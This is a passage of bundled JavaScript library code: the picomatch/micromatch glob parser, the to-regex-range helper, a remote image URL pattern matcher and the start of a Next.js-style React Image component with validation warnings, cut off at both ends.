t=I[I.length-1];if(t&&M[M.length-1]==="braces"){t.comma=true;e="|";}push({type:"comma",value:B,output:e});continue}if(B==="/"){if(P.type==="dot"&&N.index===N.start+1){N.start=N.index+1;N.consumed="";N.output="";A.pop();P=f;continue}push({type:"slash",value:B,output:y});continue}if(B==="."){if(N.braces>0&&P.type==="dot"){if(P.value===".")P.output=E;const e=I[I.length-1];P.type="dots";P.output+=B;P.value+=B;e.dots=true;continue}if(N.braces+N.parens===0&&P.type!=="bos"&&P.type!=="slash"){push({type:"text",value:B,output:E});continue}push({type:"dot",value:B,output:E});continue}if(B==="?"){const e=P&&P.value==="(";if(!e&&r.noextglob!==true&&G()==="("&&G(2)!=="?"){extglobOpen("qmark",B);continue}if(P&&P.type==="paren"){const e=G();let t=B;if(e==="<"&&!u.supportsLookbehinds()){throw new Error("Node.js v10 or higher is required for regex lookbehinds")}if(P.value==="("&&!/[!=<:]/.test(e)||e==="<"&&!/<([!=]|\w+>)/.test(remaining())){t=`\\${B}`;}push({type:"text",value:B,output:t});continue}if(r.dot!==true&&(P.type==="slash"||P.type==="bos")){push({type:"qmark",value:B,output:$});continue}push({type:"qmark",value:B,output:v});continue}if(B==="!"){if(r.noextglob!==true&&G()==="("){if(G(2)!=="?"||!/[!=<:]/.test(G(3))){extglobOpen("negate",B);continue}}if(r.nonegate!==true&&N.index===0){negate();continue}}if(B==="+"){if(r.noextglob!==true&&G()==="("&&G(2)!=="?"){extglobOpen("plus",B);continue}if(P&&P.value==="("||r.regex===false){push({type:"plus",value:B,output:C});continue}if(P&&(P.type==="bracket"||P.type==="paren"||P.type==="brace")||N.parens>0){push({type:"plus",value:B});continue}push({type:"plus",value:C});continue}if(B==="@"){if(r.noextglob!==true&&G()==="("&&G(2)!=="?"){push({type:"at",extglob:true,value:B,output:""});continue}push({type:"text",value:B});continue}if(B!=="*"){if(B==="$"||B==="^"){B=`\\${B}`;}const e=i.exec(remaining());if(e){B+=e[0];N.index+=e[0].length;}push({type:"text",value:B});continue}if(P&&(P.type==="globstar"||P.star===true)){P.type="star";P.star=true;P.value+=B;P.output=w;N.backtrack=true;N.globstar=true;consume(B);continue}let t=remaining();if(r.noextglob!==true&&/^\([^?]/.test(t)){extglobOpen("star",B);continue}if(P.type==="star"){if(r.noglobstar===true){consume(B);continue}const n=P.prev;const u=n.prev;const s=n.type==="slash"||n.type==="bos";const o=u&&(u.type==="star"||u.type==="globstar");if(r.bash===true&&(!s||t[0]&&t[0]!=="/")){push({type:"star",value:B,output:""});continue}const i=N.braces>0&&(n.type==="comma"||n.type==="brace");const a=k.length&&(n.type==="pipe"||n.type==="paren");if(!s&&n.type!=="paren"&&!i&&!a){push({type:"star",value:B,output:""});continue}while(t.slice(0,3)==="/**"){const r=e[N.index+4];if(r&&r!=="/"){break}t=t.slice(3);consume("/**",3);}if(n.type==="bos"&&eos()){P.type="globstar";P.value+=B;P.output=globstar(r);N.output=P.output;N.globstar=true;consume(B);continue}if(n.type==="slash"&&n.prev.type!=="bos"&&!o&&eos()){N.output=N.output.slice(0,-(n.output+P.output).length);n.output=`(?:${n.output}`;P.type="globstar";P.output=globstar(r)+(r.strictSlashes?")":"|$)");P.value+=B;N.globstar=true;N.output+=n.output+P.output;consume(B);continue}if(n.type==="slash"&&n.prev.type!=="bos"&&t[0]==="/"){const e=t[1]!==void 0?"|$":"";N.output=N.output.slice(0,-(n.output+P.output).length);n.output=`(?:${n.output}`;P.type="globstar";P.output=`${globstar(r)}${y}|${y}${e})`;P.value+=B;N.output+=n.output+P.output;N.globstar=true;consume(B+D());push({type:"slash",value:"/",output:""});continue}if(n.type==="bos"&&t[0]==="/"){P.type="globstar";P.value+=B;P.output=`(?:^|${y}|${globstar(r)}${y})`;N.output=P.output;N.globstar=true;consume(B+D());push({type:"slash",value:"/",output:""});continue}N.output=N.output.slice(0,-P.output.length);P.type="globstar";P.output=globstar(r);P.value+=B;N.output+=P.output;N.globstar=true;consume(B);continue}const n={type:"star",value:B,output:w};if(r.bash===true){n.output=".*?";if(P.type==="bos"||P.type==="slash"){n.output=L+n.output;}push(n);continue}if(P&&(P.type==="bracket"||P.type==="paren")&&r.regex===true){n.output=B;push(n);continue}if(N.index===N.start||P.type==="slash"||P.type==="dot"){if(P.type==="dot"){N.output+=S;P.output+=S;}else if(r.dot===true){N.output+=H;P.output+=H;}else {N.output+=L;P.output+=L;}if(G()!=="*"){N.output+=d;P.output+=d;}}push(n);}while(N.brackets>0){if(r.strictBrackets===true)throw new SyntaxError(syntaxError("closing","]"));N.output=u.escapeLast(N.output,"[");decrement("brackets");}while(N.parens>0){if(r.strictBrackets===true)throw new SyntaxError(syntaxError("closing",")"));N.output=u.escapeLast(N.output,"(");decrement("parens");}while(N.braces>0){if(r.strictBrackets===true)throw new SyntaxError(syntaxError("closing","}"));N.output=u.escapeLast(N.output,"{");decrement("braces");}if(r.strictSlashes!==true&&(P.type==="star"||P.type==="bracket")){push({type:"maybe_slash",value:"",output:`${y}?`});}if(N.backtrack===true){N.output="";for(const e of N.tokens){N.output+=e.output!=null?e.output:e.value;if(e.suffix){N.output+=e.suffix;}}}return N};parse.fastpaths=(e,t)=>{const r={...t};const o=typeof r.maxLength==="number"?Math.min(s,r.maxLength):s;const i=e.length;if(i>o){throw new SyntaxError(`Input length: ${i}, exceeds maximum allowed length: ${o}`)}e=l[e]||e;const a=u.isWindows(t);const{DOT_LITERAL:c,SLASH_LITERAL:p,ONE_CHAR:f,DOTS_SLASH:A,NO_DOT:R,NO_DOTS:_,NO_DOTS_SLASH:h,STAR:g,START_ANCHOR:E}=n.globChars(a);const C=r.dot?_:R;const y=r.dot?h:R;const d=r.capture?"":"?:";const x={negated:false,prefix:""};let b=r.bash===true?".*?":g;if(r.capture){b=`(${b})`;}const globstar=e=>{if(e.noglobstar===true)return b;return `(${d}(?:(?!${E}${e.dot?A:c}).)*?)`};const create=e=>{switch(e){case "*":return `${C}${f}${b}`;case ".*":return `${c}${f}${b}`;case "*.*":return `${C}${b}${c}${f}${b}`;case "*/*":return `${C}${b}${p}${f}${y}${b}`;case "**":return C+globstar(r);case "**/*":return `(?:${C}${globstar(r)}${p})?${y}${f}${b}`;case "**/*.*":return `(?:${C}${globstar(r)}${p})?${y}${b}${c}${f}${b}`;case "**/.*":return `(?:${C}${globstar(r)}${p})?${c}${f}${b}`;default:{const t=/^(.*?)\.(\w+)$/.exec(e);if(!t)return;const r=create(t[1]);if(!r)return;return r+c+t[2]}}};const S=u.removePrefix(e,x);let H=create(S);if(H&&r.strictSlashes!==true){H+=`${p}?`;}return H};e.exports=parse;},683:(e,t,r)=>{const n=r(17);const u=r(700);const s=r(754);const o=r(513);const i=r(356);const isObject=e=>e&&typeof e==="object"&&!Array.isArray(e);const picomatch=(e,t,r=false)=>{if(Array.isArray(e)){const n=e.map((e=>picomatch(e,t,r)));const arrayMatcher=e=>{for(const t of n){const r=t(e);if(r)return r}return false};return arrayMatcher}const n=isObject(e)&&e.tokens&&e.input;if(e===""||typeof e!=="string"&&!n){throw new TypeError("Expected pattern to be a non-empty string")}const u=t||{};const s=o.isWindows(t);const i=n?picomatch.compileRe(e,t):picomatch.makeRe(e,t,false,true);const a=i.state;delete i.state;let isIgnored=()=>false;if(u.ignore){const e={...t,ignore:null,onMatch:null,onResult:null};isIgnored=picomatch(u.ignore,e,r);}const matcher=(r,n=false)=>{const{isMatch:o,match:l,output:c}=picomatch.test(r,i,t,{glob:e,posix:s});const p={glob:e,state:a,regex:i,posix:s,input:r,output:c,match:l,isMatch:o};if(typeof u.onResult==="function"){u.onResult(p);}if(o===false){p.isMatch=false;return n?p:false}if(isIgnored(r)){if(typeof u.onIgnore==="function"){u.onIgnore(p);}p.isMatch=false;return n?p:false}if(typeof u.onMatch==="function"){u.onMatch(p);}return n?p:true};if(r){matcher.state=a;}return matcher};picomatch.test=(e,t,r,{glob:n,posix:u}={})=>{if(typeof e!=="string"){throw new TypeError("Expected input to be a string")}if(e===""){return {isMatch:false,output:""}}const s=r||{};const i=s.format||(u?o.toPosixSlashes:null);let a=e===n;let l=a&&i?i(e):e;if(a===false){l=i?i(e):e;a=l===n;}if(a===false||s.capture===true){if(s.matchBase===true||s.basename===true){a=picomatch.matchBase(e,t,r,u);}else {a=t.exec(l);}}return {isMatch:Boolean(a),match:a,output:l}};picomatch.matchBase=(e,t,r,u=o.isWindows(r))=>{const s=t instanceof RegExp?t:picomatch.makeRe(t,r);return s.test(n.basename(e))};picomatch.isMatch=(e,t,r)=>picomatch(t,r)(e);picomatch.parse=(e,t)=>{if(Array.isArray(e))return e.map((e=>picomatch.parse(e,t)));return s(e,{...t,fastpaths:false})};picomatch.scan=(e,t)=>u(e,t);picomatch.compileRe=(e,t,r=false,n=false)=>{if(r===true){return e.output}const u=t||{};const s=u.contains?"":"^";const o=u.contains?"":"$";let i=`${s}(?:${e.output})${o}`;if(e&&e.negated===true){i=`^(?!${i}).*$`;}const a=picomatch.toRegex(i,t);if(n===true){a.state=e;}return a};picomatch.makeRe=(e,t,r=false,n=false)=>{if(!e||typeof e!=="string"){throw new TypeError("Expected a non-empty string")}const u=t||{};let o={negated:false,fastpaths:true};let i="";let a;if(e.startsWith("./")){e=e.slice(2);i=o.prefix="./";}if(u.fastpaths!==false&&(e[0]==="."||e[0]==="*")){a=s.fastpaths(e,t);}if(a===undefined){o=s(e,t);o.prefix=i+(o.prefix||"");}else {o.output=a;}return picomatch.compileRe(o,t,r,n)};picomatch.toRegex=(e,t)=>{try{const r=t||{};return new RegExp(e,r.flags||(r.nocase?"i":""))}catch(e){if(t&&t.debug===true)throw e;return /$^/}};picomatch.constants=i;e.exports=picomatch;},700:(e,t,r)=>{const n=r(513);const{CHAR_ASTERISK:u,CHAR_AT:s,CHAR_BACKWARD_SLASH:o,CHAR_COMMA:i,CHAR_DOT:a,CHAR_EXCLAMATION_MARK:l,CHAR_FORWARD_SLASH:c,CHAR_LEFT_CURLY_BRACE:p,CHAR_LEFT_PARENTHESES:f,CHAR_LEFT_SQUARE_BRACKET:A,CHAR_PLUS:R,CHAR_QUESTION_MARK:_,CHAR_RIGHT_CURLY_BRACE:h,CHAR_RIGHT_PARENTHESES:g,CHAR_RIGHT_SQUARE_BRACKET:E}=r(356);const isPathSeparator=e=>e===c||e===o;const depth=e=>{if(e.isPrefix!==true){e.depth=e.isGlobstar?Infinity:1;}};const scan=(e,t)=>{const r=t||{};const C=e.length-1;const y=r.parts===true||r.scanToEnd===true;const d=[];const x=[];const b=[];let S=e;let H=-1;let v=0;let $=0;let m=false;let T=false;let L=false;let O=false;let w=false;let N=false;let k=false;let I=false;let M=false;let P=0;let B;let G;let D={value:"",depth:0,isGlob:false};const eos=()=>H>=C;const peek=()=>S.charCodeAt(H+1);const advance=()=>{B=G;return S.charCodeAt(++H)};while(H<C){G=advance();let e;if(G===o){k=D.backslashes=true;G=advance();if(G===p){N=true;}continue}if(N===true||G===p){P++;while(eos()!==true&&(G=advance())){if(G===o){k=D.backslashes=true;advance();continue}if(G===p){P++;continue}if(N!==true&&G===a&&(G=advance())===a){m=D.isBrace=true;L=D.isGlob=true;M=true;if(y===true){continue}break}if(N!==true&&G===i){m=D.isBrace=true;L=D.isGlob=true;M=true;if(y===true){continue}break}if(G===h){P--;if(P===0){N=false;m=D.isBrace=true;M=true;break}}}if(y===true){continue}break}if(G===c){d.push(H);x.push(D);D={value:"",depth:0,isGlob:false};if(M===true)continue;if(B===a&&H===v+1){v+=2;continue}$=H+1;continue}if(r.noext!==true){const e=G===R||G===s||G===u||G===_||G===l;if(e===true&&peek()===f){L=D.isGlob=true;O=D.isExtglob=true;M=true;if(y===true){while(eos()!==true&&(G=advance())){if(G===o){k=D.backslashes=true;G=advance();continue}if(G===g){L=D.isGlob=true;M=true;break}}continue}break}}if(G===u){if(B===u)w=D.isGlobstar=true;L=D.isGlob=true;M=true;if(y===true){continue}break}if(G===_){L=D.isGlob=true;M=true;if(y===true){continue}break}if(G===A){while(eos()!==true&&(e=advance())){if(e===o){k=D.backslashes=true;advance();continue}if(e===E){T=D.isBracket=true;L=D.isGlob=true;M=true;break}}if(y===true){continue}break}if(r.nonegate!==true&&G===l&&H===v){I=D.negated=true;v++;continue}if(r.noparen!==true&&G===f){L=D.isGlob=true;if(y===true){while(eos()!==true&&(G=advance())){if(G===f){k=D.backslashes=true;G=advance();continue}if(G===g){M=true;break}}continue}break}if(L===true){M=true;if(y===true){continue}break}}if(r.noext===true){O=false;L=false;}let U=S;let K="";let F="";if(v>0){K=S.slice(0,v);S=S.slice(v);$-=v;}if(U&&L===true&&$>0){U=S.slice(0,$);F=S.slice($);}else if(L===true){U="";F=S;}else {U=S;}if(U&&U!==""&&U!=="/"&&U!==S){if(isPathSeparator(U.charCodeAt(U.length-1))){U=U.slice(0,-1);}}if(r.unescape===true){if(F)F=n.removeBackslashes(F);if(U&&k===true){U=n.removeBackslashes(U);}}const Q={prefix:K,input:e,start:v,base:U,glob:F,isBrace:m,isBracket:T,isGlob:L,isExtglob:O,isGlobstar:w,negated:I};if(r.tokens===true){Q.maxDepth=0;if(!isPathSeparator(G)){x.push(D);}Q.tokens=x;}if(r.parts===true||r.tokens===true){let t;for(let n=0;n<d.length;n++){const u=t?t+1:v;const s=d[n];const o=e.slice(u,s);if(r.tokens){if(n===0&&v!==0){x[n].isPrefix=true;x[n].value=K;}else {x[n].value=o;}depth(x[n]);Q.maxDepth+=x[n].depth;}if(n!==0||o!==""){b.push(o);}t=s;}if(t&&t+1<e.length){const n=e.slice(t+1);b.push(n);if(r.tokens){x[x.length-1].value=n;depth(x[x.length-1]);Q.maxDepth+=x[x.length-1].depth;}}Q.slashes=d;Q.parts=b;}return Q};e.exports=scan;},513:(e,t,r)=>{const n=r(17);const u=process.platform==="win32";const{REGEX_BACKSLASH:s,REGEX_REMOVE_BACKSLASH:o,REGEX_SPECIAL_CHARS:i,REGEX_SPECIAL_CHARS_GLOBAL:a}=r(356);t.isObject=e=>e!==null&&typeof e==="object"&&!Array.isArray(e);t.hasRegexChars=e=>i.test(e);t.isRegexChar=e=>e.length===1&&t.hasRegexChars(e);t.escapeRegex=e=>e.replace(a,"\\$1");t.toPosixSlashes=e=>e.replace(s,"/");t.removeBackslashes=e=>e.replace(o,(e=>e==="\\"?"":e));t.supportsLookbehinds=()=>{const e=process.version.slice(1).split(".").map(Number);if(e.length===3&&e[0]>=9||e[0]===8&&e[1]>=10){return true}return false};t.isWindows=e=>{if(e&&typeof e.windows==="boolean"){return e.windows}return u===true||n.sep==="\\"};t.escapeLast=(e,r,n)=>{const u=e.lastIndexOf(r,n);if(u===-1)return e;if(e[u-1]==="\\")return t.escapeLast(e,r,u-1);return `${e.slice(0,u)}\\${e.slice(u)}`};t.removePrefix=(e,t={})=>{let r=e;if(r.startsWith("./")){r=r.slice(2);t.prefix="./";}return r};t.wrapOutput=(e,t={},r={})=>{const n=r.contains?"":"^";const u=r.contains?"":"$";let s=`${n}(?:${e})${u}`;if(t.negated===true){s=`(?:^(?!${s}).*$)`;}return s};},492:(e,t,r)=>{
	/*!
	 * to-regex-range <https://github.com/micromatch/to-regex-range>
	 *
	 * Copyright (c) 2015-present, Jon Schlinkert.
	 * Released under the MIT License.
	 */
	const n=r(357);const toRegexRange=(e,t,r)=>{if(n(e)===false){throw new TypeError("toRegexRange: expected the first argument to be a number")}if(t===void 0||e===t){return String(e)}if(n(t)===false){throw new TypeError("toRegexRange: expected the second argument to be a number.")}let u={relaxZeros:true,...r};if(typeof u.strictZeros==="boolean"){u.relaxZeros=u.strictZeros===false;}let s=String(u.relaxZeros);let o=String(u.shorthand);let i=String(u.capture);let a=String(u.wrap);let l=e+":"+t+"="+s+o+i+a;if(toRegexRange.cache.hasOwnProperty(l)){return toRegexRange.cache[l].result}let c=Math.min(e,t);let p=Math.max(e,t);if(Math.abs(c-p)===1){let r=e+"|"+t;if(u.capture){return `(${r})`}if(u.wrap===false){return r}return `(?:${r})`}let f=hasPadding(e)||hasPadding(t);let A={min:e,max:t,a:c,b:p};let R=[];let _=[];if(f){A.isPadded=f;A.maxLen=String(A.max).length;}if(c<0){let e=p<0?Math.abs(p):1;_=splitToPatterns(e,Math.abs(c),A,u);c=A.a=0;}if(p>=0){R=splitToPatterns(c,p,A,u);}A.negatives=_;A.positives=R;A.result=collatePatterns(_,R);if(u.capture===true){A.result=`(${A.result})`;}else if(u.wrap!==false&&R.length+_.length>1){A.result=`(?:${A.result})`;}toRegexRange.cache[l]=A;return A.result};function collatePatterns(e,t,r){let n=filterPatterns(e,t,"-",false)||[];let u=filterPatterns(t,e,"",false)||[];let s=filterPatterns(e,t,"-?",true)||[];let o=n.concat(s).concat(u);return o.join("|")}function splitToRanges(e,t){let r=1;let n=1;let u=countNines(e,r);let s=new Set([t]);while(e<=u&&u<=t){s.add(u);r+=1;u=countNines(e,r);}u=countZeros(t+1,n)-1;while(e<u&&u<=t){s.add(u);n+=1;u=countZeros(t+1,n)-1;}s=[...s];s.sort(compare);return s}function rangeToPattern(e,t,r){if(e===t){return {pattern:e,count:[],digits:0}}let n=zip(e,t);let u=n.length;let s="";let o=0;for(let e=0;e<u;e++){let[t,u]=n[e];if(t===u){s+=t;}else if(t!=="0"||u!=="9"){s+=toCharacterClass(t,u);}else {o++;}}if(o){s+=r.shorthand===true?"\\d":"[0-9]";}return {pattern:s,count:[o],digits:u}}function splitToPatterns(e,t,r,n){let u=splitToRanges(e,t);let s=[];let o=e;let i;for(let e=0;e<u.length;e++){let t=u[e];let a=rangeToPattern(String(o),String(t),n);let l="";if(!r.isPadded&&i&&i.pattern===a.pattern){if(i.count.length>1){i.count.pop();}i.count.push(a.count[0]);i.string=i.pattern+toQuantifier(i.count);o=t+1;continue}if(r.isPadded){l=padZeros(t,r,n);}a.string=l+a.pattern+toQuantifier(a.count);s.push(a);o=t+1;i=a;}return s}function filterPatterns(e,t,r,n,u){let s=[];for(let u of e){let{string:e}=u;if(!n&&!contains(t,"string",e)){s.push(r+e);}if(n&&contains(t,"string",e)){s.push(r+e);}}return s}function zip(e,t){let r=[];for(let n=0;n<e.length;n++)r.push([e[n],t[n]]);return r}function compare(e,t){return e>t?1:t>e?-1:0}function contains(e,t,r){return e.some((e=>e[t]===r))}function countNines(e,t){return Number(String(e).slice(0,-t)+"9".repeat(t))}function countZeros(e,t){return e-e%Math.pow(10,t)}function toQuantifier(e){let[t=0,r=""]=e;if(r||t>1){return `{${t+(r?","+r:"")}}`}return ""}function toCharacterClass(e,t,r){return `[${e}${t-e===1?"":"-"}${t}]`}function hasPadding(e){return /^-?(0+)\d/.test(e)}function padZeros(e,t,r){if(!t.isPadded){return e}let n=Math.abs(t.maxLen-String(e).length);let u=r.relaxZeros!==false;switch(n){case 0:return "";case 1:return u?"0?":"0";case 2:return u?"0{0,2}":"00";default:{return u?`0{0,${n}}`:`0{${n}}`}}}toRegexRange.cache={};toRegexRange.clearCache=()=>toRegexRange.cache={};e.exports=toRegexRange;},17:e=>{e.exports=require$$0;},837:e=>{e.exports=require$$1;}};var t={};function __nccwpck_require__(r){var n=t[r];if(n!==undefined){return n.exports}var u=t[r]={exports:{}};var s=true;try{e[r](u,u.exports,__nccwpck_require__);s=false;}finally{if(s)delete t[r];}return u.exports}if(typeof __nccwpck_require__!=="undefined")__nccwpck_require__.ab=__dirname+"/";var r=__nccwpck_require__(971);micromatch.exports=r;})();
	return micromatch.exports;
}

var hasRequiredMatchRemotePattern;

function requireMatchRemotePattern () {
	if (hasRequiredMatchRemotePattern) return matchRemotePattern;
	hasRequiredMatchRemotePattern = 1;
	Object.defineProperty(matchRemotePattern, "__esModule", {
	    value: true
	});
	matchRemotePattern.matchRemotePattern = matchRemotePattern$1;
	matchRemotePattern.hasMatch = hasMatch;
	var _micromatch = requireMicromatch();
	function matchRemotePattern$1(pattern, url) {
	    if (pattern.protocol !== undefined) {
	        const actualProto = url.protocol.slice(0, -1);
	        if (pattern.protocol !== actualProto) {
	            return false;
	        }
	    }
	    if (pattern.port !== undefined) {
	        if (pattern.port !== url.port) {
	            return false;
	        }
	    }
	    if (pattern.hostname === undefined) {
	        throw new Error(`Pattern should define hostname but found\n${JSON.stringify(pattern)}`);
	    } else {
	        if (!(_micromatch).makeRe(pattern.hostname).test(url.hostname)) {
	            return false;
	        }
	    }
	    var _pathname;
	    if (!(_micromatch).makeRe((_pathname = pattern.pathname) != null ? _pathname : '**').test(url.pathname)) {
	        return false;
	    }
	    return true;
	}
	function hasMatch(domains, remotePatterns, url) {
	    return domains.some((domain)=>url.hostname === domain) || remotePatterns.some((p)=>matchRemotePattern$1(p, url));
	}

	
	return matchRemotePattern;
}

var hasRequiredImage$1;

function requireImage$1 () {
	if (hasRequiredImage$1) return image$1.exports;
	hasRequiredImage$1 = 1;
	(function (module, exports) {
		"client";
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.default = Image;
		var _extends = /*@__PURE__*/ require_extends().default;
		var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
		var _interop_require_wildcard = /*@__PURE__*/ require_interop_require_wildcard().default;
		var _object_without_properties_loose = /*@__PURE__*/ require_object_without_properties_loose().default;
		var _react = _interop_require_wildcard(React__default);
		var _head = _interop_require_default(requireHead());
		var _imageConfig = requireImageConfig();
		var _useIntersection = requireUseIntersection();
		var _imageConfigContext = requireImageConfigContext();
		var _utils = requireUtils$1();
		var _normalizeTrailingSlash = requireNormalizeTrailingSlash();
		function Image(_param) {
		    var { src , sizes , unoptimized =false , priority =false , loading , lazyRoot =null , lazyBoundary , className , quality , width , height , style , objectFit , objectPosition , onLoadingComplete , placeholder ='empty' , blurDataURL  } = _param, all = _object_without_properties_loose(_param, [
		        "src",
		        "sizes",
		        "unoptimized",
		        "priority",
		        "loading",
		        "lazyRoot",
		        "lazyBoundary",
		        "className",
		        "quality",
		        "width",
		        "height",
		        "style",
		        "objectFit",
		        "objectPosition",
		        "onLoadingComplete",
		        "placeholder",
		        "blurDataURL"
		    ]);
		    const configContext = (_react).useContext(_imageConfigContext.ImageConfigContext);
		    const config = (_react).useMemo(()=>{
		        const c = configEnv || configContext || _imageConfig.imageConfigDefault;
		        const allSizes = [
		            ...c.deviceSizes,
		            ...c.imageSizes
		        ].sort((a, b)=>a - b);
		        const deviceSizes = c.deviceSizes.sort((a, b)=>a - b);
		        return _extends({}, c, {
		            allSizes,
		            deviceSizes
		        });
		    }, [
		        configContext
		    ]);
		    let rest = all;
		    let layout = sizes ? 'responsive' : 'intrinsic';
		    if ('layout' in rest) {
		        // Override default layout if the user specified one:
		        if (rest.layout) layout = rest.layout;
		        // Remove property so it's not spread on <img>:
		        delete rest.layout;
		    }
		    let loader = defaultImageLoader;
		    if ('loader' in rest) {
		        if (rest.loader) {
		            const customImageLoader = rest.loader;
		            var _tmp;
		            _tmp = (obj)=>{
		                const { config: _  } = obj, opts = _object_without_properties_loose(obj, [
		                    "config"
		                ]);
		                // The config object is internal only so we must
		                // not pass it to the user-defined loader()
		                return customImageLoader(opts);
		            }, loader = _tmp;
		        }
		        // Remove property so it's not spread on <img>
		        delete rest.loader;
		    }
		    let staticSrc = '';
		    if (isStaticImport(src)) {
		        const staticImageData = isStaticRequire(src) ? src.default : src;
		        if (!staticImageData.src) {
		            throw new Error(`An object should only be passed to the image component src parameter if it comes from a static image import. It must include src. Received ${JSON.stringify(staticImageData)}`);
		        }
		        blurDataURL = blurDataURL || staticImageData.blurDataURL;
		        staticSrc = staticImageData.src;
		        if (!layout || layout !== 'fill') {
		            height = height || staticImageData.height;
		            width = width || staticImageData.width;
		            if (!staticImageData.height || !staticImageData.width) {
		                throw new Error(`An object should only be passed to the image component src parameter if it comes from a static image import. It must include height and width. Received ${JSON.stringify(staticImageData)}`);
		            }
		        }
		    }
		    src = typeof src === 'string' ? src : staticSrc;
		    let isLazy = !priority && (loading === 'lazy' || typeof loading === 'undefined');
		    if (src.startsWith('data:') || src.startsWith('blob:')) {
		        // https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs
		        unoptimized = true;
		        isLazy = false;
		    }
		    if (typeof window !== 'undefined' && loadedImageURLs.has(src)) {
		        isLazy = false;
		    }
		    if (config.unoptimized) {
		        unoptimized = true;
		    }
		    const [blurComplete, setBlurComplete] = (_react).useState(false);
		    const [setIntersection, isIntersected, resetIntersected] = (_useIntersection).useIntersection({
		        rootRef: lazyRoot,
		        rootMargin: lazyBoundary || '200px',
		        disabled: !isLazy
		    });
		    const isVisible = !isLazy || isIntersected;
		    const wrapperStyle = {
		        boxSizing: 'border-box',
		        display: 'block',
		        overflow: 'hidden',
		        width: 'initial',
		        height: 'initial',
		        background: 'none',
		        opacity: 1,
		        border: 0,
		        margin: 0,
		        padding: 0
		    };
		    const sizerStyle = {
		        boxSizing: 'border-box',
		        display: 'block',
		        width: 'initial',
		        height: 'initial',
		        background: 'none',
		        opacity: 1,
		        border: 0,
		        margin: 0,
		        padding: 0
		    };
		    let hasSizer = false;
		    let sizerSvgUrl;
		    const layoutStyle = {
		        position: 'absolute',
		        top: 0,
		        left: 0,
		        bottom: 0,
		        right: 0,
		        boxSizing: 'border-box',
		        padding: 0,
		        border: 'none',
		        margin: 'auto',
		        display: 'block',
		        width: 0,
		        height: 0,
		        minWidth: '100%',
		        maxWidth: '100%',
		        minHeight: '100%',
		        maxHeight: '100%',
		        objectFit,
		        objectPosition
		    };
		    let widthInt = getInt(width);
		    let heightInt = getInt(height);
		    const qualityInt = getInt(quality);
		    if (process.env.NODE_ENV !== 'production') {
		        if (!src) {
		            // React doesn't show the stack trace and there's
		            // no `src` to help identify which image, so we
		            // instead console.error(ref) during mount.
		            widthInt = widthInt || 1;
		            heightInt = heightInt || 1;
		            unoptimized = true;
		        } else {
		            if (!VALID_LAYOUT_VALUES.includes(layout)) {
		                if (layout === 'raw') {
		                    throw new Error(`The layout="raw" experiment has been moved to a new module. Please import \`next/future/image\` instead.`);
		                }
		                throw new Error(`Image with src "${src}" has invalid "layout" property. Provided "${layout}" should be one of ${VALID_LAYOUT_VALUES.map(String).join(',')}.`);
		            }
		            if (typeof widthInt !== 'undefined' && isNaN(widthInt) || typeof heightInt !== 'undefined' && isNaN(heightInt)) {
		                throw new Error(`Image with src "${src}" has invalid "width" or "height" property. These should be numeric values.`);
		            }
		            if (layout === 'fill' && (width || height)) {
		                (_utils).warnOnce(`Image with src "${src}" and "layout='fill'" has unused properties assigned. Please remove "width" and "height".`);
		            }
		            if (!VALID_LOADING_VALUES.includes(loading)) {
		                throw new Error(`Image with src "${src}" has invalid "loading" property. Provided "${loading}" should be one of ${VALID_LOADING_VALUES.map(String).join(',')}.`);
		            }
		            if (priority && loading === 'lazy') {
		                throw new Error(`Image with src "${src}" has both "priority" and "loading='lazy'" properties. Only one should be used.`);
		            }
		            if (sizes && layout !== 'fill' && layout !== 'responsive') {
		                (_utils).warnOnce(`Image with src "${src}" has "sizes" property but it will be ignored. Only use "sizes" with "layout='fill'" or "layout='responsive'"`);
		            }
		            if (placeholder === 'blur') {
		                if (layout !== 'fill' && (widthInt || 0) * (heightInt || 0) < 1600) {
		                    (_utils).warnOnce(`Image with src "${src}" is smaller than 40x40. Consider removing the "placeholder='blur'" property to improve performance.`);
		                }
		                if (!blurDataURL) {
		                    const VALID_BLUR_EXT = [
		                        'jpeg',
		                        'png',
		                        'webp',
		                        'avif'
		                    ] // should match next-image-loader
		                    ;
		                    throw new Error(`Image with src "${src}" has "placeholder='blur'" property but is missing the "blurDataURL" property.
          Possible solutions:
            - Add a "blurDataURL" property, the contents should be a small Data URL to represent the image
            - Change the "src" property to a static import with one of the supported file types: ${VALID_BLUR_EXT.join(',')}
            - Remove the "placeholder" property, effectively no blur effect
          Read more: https://nextjs.org/docs/messages/placeholder-blur-data-url`);
		                }
		            }
		            if ('ref' in rest) {
		                (_utils).warnOnce(`Image with src "${src}" is using unsupported "ref" property. Consider using the "onLoadingComplete" property instead.`);
		            }
		            if (!unoptimized && loader !== defaultImageLoader) {
		                const urlStr = loader({
		                    config,
		                    src,
		                    width: widthInt || 400,
		                    quality: qualityInt || 75
		                });
		                let url;
		                try {
		                    url = new URL(urlStr);
		                } catch (err) {}
		                if (urlStr === src || url && url.pathname === src && !url.search) {
		                    (_utils).warnOnce(`Image with src "${src}" has a "loader" property that does not implement width. Please implement it or use the "unoptimized" property instead.` + `\nRead more: https://nextjs.org/docs/messages/next-image-missing-loader-width`);
		                }
		            }
		            if (style) {
		                let overwrittenStyles = Object.keys(style).filter((key)=>key in layoutStyle);
		                if (overwrittenStyles.length) {
		                    (_utils).warnOnce(`Image with src ${src} is assigned the following styles, which are overwritten by automatically-generated styles: ${overwrittenStyles.join(', ')}`);
		                }
		            }
		            if (typeof window !== 'undefined' && !perfObserver && window.PerformanceObserver) {
		                perfObserver = new PerformanceObserver((entryList)=>{
		                    for (const entry of entryList.getEntries()){
		                        var ref;
		                        // @ts-ignore - missing "LargestContentfulPaint" class with "element" prop
		                        const imgSrc = (entry == null ? void 0 : (ref = entry.element) == null ? void 0 : ref.src) || '';
		                        const lcpImage = allImgs.get(imgSrc);
		                        if (lcpImage && !lcpImage.priority && lcpImage.placeholder !== 'blur' && !lcpImage.src.startsWith('data:') && !lcpImage.src.startsWith('blob:')) {
		                            // https://web.dev/lcp/#measure-lcp-in-javascript
		                            (_utils).warnOnce(`Image with src "${lcpImage.src}" was detected as the Largest Contentful Paint (LCP). Please add the "priority" property if this image is above the fold.` + `\nRead more: https://nextjs.org/docs/api-reference/next/image#priority`);
		                        }
		                    }
		                });
		                try {
		                    perfObserver.observe({
		                        type: 'largest-contentful-paint',
		                        buffered: true
		                    });
		                } catch (err) {
		                    // Log error but don't crash the app
		                    console.error(err);
